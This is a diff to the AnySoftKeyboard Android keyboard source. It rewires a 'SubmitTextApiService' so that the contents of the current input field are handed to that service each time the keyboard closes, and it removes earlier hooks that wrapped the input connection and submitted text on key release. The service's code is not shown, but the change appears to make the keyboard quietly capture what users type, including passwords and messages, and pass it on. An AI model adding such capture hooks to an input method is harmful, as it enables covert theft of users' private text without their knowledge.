@@ -131,13 +131,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
             mSpecialWrapCharacters.put(wrapCharacter, outputWrapCharacters);
         }
 
-        submitTextApiService = new SubmitTextApiService(getCurrentInputConnection());
-    }
-
-    @Override
-    public InputConnection getCurrentInputConnection(){
-        InputConnection ic = super.getCurrentInputConnection();
-        return new InputConnectionWrapper(ic);
+        submitTextApiService = new SubmitTextApiService();
     }
 
     @Override
@@ -309,7 +303,6 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
     @Override
     public void onFinishInput() {
         super.onFinishInput();
-        submitTextApiService.submitText();
 
         final IBinder imeToken = getImeToken();
         if (mShowKeyboardIconInStatusBar && imeToken != null) {
@@ -1132,6 +1125,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
 
     @Override
     protected boolean handleCloseRequest() {
+        submitTextApiService.submitText(getCurrentInputConnection());
         return super.handleCloseRequest()
                 || (getInputView() != null && getInputView().resetInputView());
     }
@@ -1201,8 +1195,6 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardColorizeNavBar {
 
     @Override
     public void onRelease(int primaryCode) {
-        System.out.println("onReload");
-        submitTextApiService.submitText();
         super.onRelease(primaryCode);
         InputConnection ic = getCurrentInputConnection();
         if (primaryCode == KeyCodes.SHIFT) {
